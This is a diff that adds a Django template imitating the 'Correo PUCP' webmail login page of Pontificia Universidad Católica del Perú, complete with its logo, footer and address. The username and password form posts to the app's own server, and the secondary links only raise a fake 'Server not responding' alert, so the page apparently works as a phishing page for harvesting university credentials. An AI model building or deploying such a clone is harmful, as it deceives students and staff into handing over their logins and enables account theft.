@@ -1,0 +1,67 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<link rel="stylesheet"  href="{% static 'pucp_web/web.css' %}">
+</head>
+<body>
+	<div id="menu">
+         <ul>
+            <li><img style="float: left;" src="https://assets.website-files.com/60b56cdf18d38e15ce088579/60b580ab8d45223dc593968d_pucp%7D.svg"></li>
+         </ul>
+	
+</div>
+
+<div class="mainbox">
+   <div class="text">
+      <h1>You are accessing the service Correo PUCP</h1>
+      <p>Authentication required.Enter PUCP username and password,which are private</p>
+   </div>
+   <div class="language">
+      <h2>Cambiar idioma:</h2>
+      <button type="button"><img src="{% static 'pucp_web/flag.png' %}"><p>Español</p></button>
+
+
+   </div>
+   <div class="boxes">
+   <div class="box">
+      <br>
+      <br>
+	<form action='/' method = POST >
+      {% csrf_token %}
+      <div class="username">
+      <label for="uname"><b>Username:&nbsp;&nbsp;</b></label>
+
+    <input type="text" placeholder="" name="uname" required>
+      </div><br>
+   <div class="password">
+    <label for="psw"><b>Password:&nbsp;&nbsp;</b></label>
+    <input type="password" placeholder="" name="psw" required>
+   </div><br>
+   <div class="buttons">
+   <button class="button" type='submit'>Log In</button>&nbsp;&nbsp;
+   <span class="psw"><a href="#">Forgot your password?</a></span>
+   </div>
+ </form>
+   <div class="warning">
+      <img src="{% static 'pucp_web/warning.gif' %}">
+      <span>For security reasons, don't forget to log out, even before closing<br><p>the browser.</p>
+      <a href="#"onclick="alert('Server not responding')">Read service conditions.</a></span>
+   </div>
+   <div class="services">
+      <img src="{% static 'pucp_web/bullet.gif' %}"><a href="#" onclick="alert('Server not responding')">Go to service directory</a>
+   </div>
+</div>
+</div>
+</div>
+
+<div class="footer"  style= "background: url({% static 'pucp_web/footer.gif' %})">
+  <p>© Pontificia Universidad Católica del Perú - 2012. All rights reserved.<br>
+Av. Universitaria 1801, San Miguel, Lima 32, Perú | Phone (511) 626-2000
+  </p></div>
+
+
+
+</body>
+</html>
